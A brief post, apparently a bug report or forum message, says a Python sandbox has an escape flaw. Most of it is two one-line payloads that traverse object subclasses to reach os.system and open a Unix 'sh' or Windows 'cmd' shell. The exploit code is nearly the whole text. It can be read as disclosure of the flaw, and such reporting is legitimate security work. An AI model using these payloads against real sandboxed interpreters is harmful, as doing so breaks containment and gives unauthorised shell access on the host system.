This sandbox had the flaw of a sandbox escape, I managed to get to the windows cmd or unix sh with the following code:

().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('sh')

Or 

().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cmd')

